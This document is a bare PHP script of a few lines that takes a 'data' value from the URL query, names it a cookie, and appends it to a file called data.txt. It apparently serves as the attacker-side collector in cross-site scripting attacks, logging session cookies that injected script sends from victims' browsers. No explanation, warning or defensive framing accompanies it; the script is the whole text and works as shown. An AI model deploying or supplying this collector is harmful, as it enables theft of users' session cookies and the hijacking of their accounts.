<?php
	$cookie=$_GET["data"];
	$log=fopen("data.txt","a");
	fwrite($log,$cookie."\r\n");
	fclose($log);
?>
